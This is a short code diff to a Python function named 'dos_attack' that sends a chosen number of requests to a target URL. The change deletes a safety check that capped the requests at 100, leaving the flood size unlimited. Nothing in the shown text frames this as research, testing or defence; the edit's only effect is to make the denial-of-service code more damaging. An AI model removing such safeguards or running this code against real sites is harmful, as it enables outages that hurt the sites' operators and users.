@@ -10,11 +10,6 @@ def dos_attack(url, power):
         # Convert power to integer
         num_requests = int(power)
 
-        # Limit the number of requests for safety
-        if num_requests > 100:
-            num_requests = 100
-            print("Limiting to 100 requests for safety")
-
         print(f"Sending {num_requests} requests to {url}")
 
         start_time = time.time()
